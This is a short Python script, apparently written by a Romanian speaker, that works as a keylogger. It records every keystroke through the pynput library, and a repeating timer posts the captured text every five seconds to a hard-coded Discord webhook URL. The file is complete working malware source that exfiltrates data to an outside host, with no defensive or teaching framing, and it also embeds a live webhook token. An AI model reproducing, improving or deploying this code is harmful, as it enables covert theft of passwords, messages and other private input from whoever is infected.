import os
import threading
from pynput import keyboard
import requests

try:
    import pynput
except ImportError:
    os.system("pip install pynput requests")

webhook_url = "https://discord.com/api/webhooks/1442428343965188129/lSoN-8yNzw40_aU3l8ASFB6Cb4N4YYYY-WJ2PFpL4PwxxUxmocwRnnFjEK5h0ZNjsqG0"

text = ""
time_interval = 5

def send_data():
    global text
    if len(text) > 1:
        data = {
            "content": text,
            "title": "x"
        }
        try:
            requests.post(webhook_url, json=data)
            text = "" 
        except Exception as e:
            print(f"Eroare la trimitere: {e}")

    # Repornim timer-ul
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    try:
        text += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.backspace:
            if len(text) > 0:
                text = text[:-1]
with keyboard.Listener(on_press=on_press) as listener:
    send_data() 
    listener.join()
